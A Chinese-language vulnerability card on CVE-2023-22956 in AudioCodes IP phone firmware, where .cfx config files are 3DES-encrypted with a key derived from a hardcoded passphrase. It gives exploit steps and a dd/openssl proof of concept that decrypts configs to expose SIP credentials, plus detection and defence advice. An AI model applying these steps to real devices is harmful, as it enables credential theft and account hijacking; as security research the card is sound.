---
id: code-analysis-reverse-firmware-audiocodes-config-evp-bytestokey-decrypt
title: AudioCodes decryption_tool 配置文件加密硬编码口令：EVP_BytesToKey 派生 3DES 密钥解密 .cfx（CVE-2023-22956）
type: scenario
domain: code-analysis
path: code-analysis/reverse/firmware
technique: audiocodes-decryption-tool-evp-bytestokey-cfx
tags:
- firmware
- reverse
- audiocodes
- openssl
- evp-bytestokey
- des3
- hardcoded-key
- cve-2023-22956
cve:
- CVE-2023-22956
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: AudioCodes C450HD UC 3.4.6.604.1（原文测试版本）
verification:
  verified_by: verifier-V516
  verified_at: '2026-11-11T11:44:03+08:00'
  notes: 已对照原文与截图核对：encryption_tool.exe生成.cfx说明(图17)、libcgi.so调用decryption_tool(原文命令)、FUN_00011620 memcpy s_h4dAratH(图18)、FUN_000111a0保存到r7(图19)、EVP_BytesToKey第四参数(图20)、0x1e8f处口令字符串(图21)、dd count=64提取与openssl enc -des-ede3-cbc -P -pass pass:... -nosalt派生key/iv并解密cfx的PoC均一致；CVE-2023-22956=SYSS-2022-054映射正确。key/iv原文打码，卡片如实说明。affected_versions为原文测试版本(图28)，非受影响区间。dedup候选为AES前端密钥/Snake DES等不同产品链，非同链。
url: /docs/code-analysis/reverse/firmware/code-analysis-reverse-firmware-audiocodes-config-evp-bytestokey-decrypt/
draft: false
kb_aliases:
- CVE-2023-22956
- AudioCodes 配置文件解密
- decryption_tool 硬编码口令
- EVP_BytesToKey 3DES
- .cfx 配置解密
- SYSS-2022-054
---

## 一句话结论

AudioCodes 官方 `encryption_tool.exe` 生成的加密配置文件（`.cfx`）由设备端 `/home/ipphone/bin/decryption_tool` 解密，算法是 OpenSSL `EVP_des_ede3_cbc`，密钥/IV 由 `EVP_BytesToKey` 从一段硬编码口令派生；逆向该二进制可定位 0x1e8f 处的 64 字节口令，用 `openssl enc -des-ede3-cbc -pass pass:<口令> -nosalt` 即可解密任意 `.cfx`，读出 `auth_name`/`auth_password` 等明文（CVE-2023-22956，SYSS-2022-054）。

## 原理

- AudioCodes 配置可以加密存储：文档要求用 `encryption_tool.exe -f <file>.cfg` 生成 `.cfx`，再通过「Configuration URL / Dynamic Configuration URL」下发。
- 设备端 `/lib/libcgi.so` 检查配置文件是否加密，并执行：
  `/home/ipphone/bin/decryption_tool -f /tmp/back_file.cfx -o <output> > /dev/null`
  所以解密逻辑在 `decryption_tool` 中。
- 逆向后可见它导入 OpenSSL `EVP_des_ede3_cbc`，密钥和 IV 通过 `EVP_BytesToKey` 从口令派生。`EVP_BytesToKey` 的第四个参数就是口令字符串：在函数 `00011620` 中该字符串先经 `memcpy` 到栈上，再经 `FUN_000111a0` 保存到 `r7`，最后作为第四个参数传给 `EVP_BytesToKey`。
- 口令字符串硬编码在二进制偏移 `0x1e8f`，长度 64 字节（原文截图 `s_h4dAratH...`）。
- 因为口令全设备相同且无盐（`-nosalt`），任何拿到 `.cfx` 的人都能离线解密；`.cfx` 可能来自配置服务、备份或网络流量。

## 触发条件

- 目标为使用该硬编码口令的 AudioCodes 固件（原文 C450HD UC 3.4.6.604.1）。
- 攻击者能获得 `decryption_tool` 二进制（官方固件或已 root 的文件系统）以提取口令。
- 攻击者能获得至少一个 `.cfx` 加密配置文件（配置服务响应、备份、流量或本地文件）。

## 利用步骤

1. 下载固件并取出 `/home/ipphone/bin/decryption_tool`（或从设备 root shell 直接复制）。
2. 用 Ghidra/objdump 定位 `EVP_BytesToKey` 调用，确认第四个参数的口令字符串来自偏移 `0x1e8f`。
3. 提取 64 字节口令：`dd skip=$((0x1e8f)) count=64 if=decryption_tool of=secret.bin bs=1`。
4. 用 openssl 验证派生出的 key/iv，并解密 `.cfx`。
5. 读取明文配置中的 `voip/line/0/auth_name`、`voip/line/0/auth_password` 等字段，用于登录/注册劫持。

## PoC

```bash
# 提取硬编码口令
$ offset=$(python3 -c 'print(int("00001e8f", base=16))')
$ dd skip=$offset count=64 if=decryption_tool of=secret.bin bs=1

# 查看派生出的 key/iv
$ secret=$(cat secret.bin)
$ openssl enc -des-ede3-cbc -P -pass pass:$secret -nosalt
key=40DA61##########################################
iv =C614############

# 解密 .cfx
$ openssl enc -d -des-ede3-cbc -pass pass:$secret -nosalt \
        -in encrypted_config.cfx -out plain_config.cfg
$ cat plain_config.cfg
voip/line/0/enabled=1
voip/line/0/id=123
voip/line/0/auth_name=XYZ
voip/line/0/auth_password=XYZ
```

`key`/`iv` 在原文中做了打码，实际值由提取到的口令派生。

## 变体与关联

- 变体：也用 `-nosalt` 时相同口令/明文产生相同密钥与 IV，密文可重放/比对；若拿到一段已知明文-密文对，可直接校验口令。
- 变体：配置模板把 `provisioning/configuration/url` 指向攻击者可控的 `.cfx` 也可反向利用（设备解密并应用攻击者配置）。
- 关联：[[code-analysis-reverse-firmware-audiocodes-hardcoded-des3-password-decrypt]]——同设备另一套硬编码 3DES 密钥，用于字段级口令加密（CVE-2023-22957）。
- 关联：[[iot-zoom-ztp-mac-claim-malicious-firmware-takeover]]——通过 ZTP 下发配置的服务链路。

## 检测与防御

- 防御：禁止全设备共用硬编码口令；改用每设备唯一的密钥（硬件派生/安全芯片）与随机盐，算法升级为带认证的 AES-GCM。
- 防御：配置文件签名并加密，解密密钥不以明文/可提取形式随固件分发；配置下发接口鉴权。
- 检测：固件中搜索 `EVP_BytesToKey` + `EVP_des_ede3_cbc` 组合与硬编码长字符串；`.cfx` 配置分发出现未授权下载或异常来源告警。
- 检测：抓包/日志中出现大量 `.cfx` 拉取后，用已知固件口令离线尝试解密（红队验证），成功即高危。
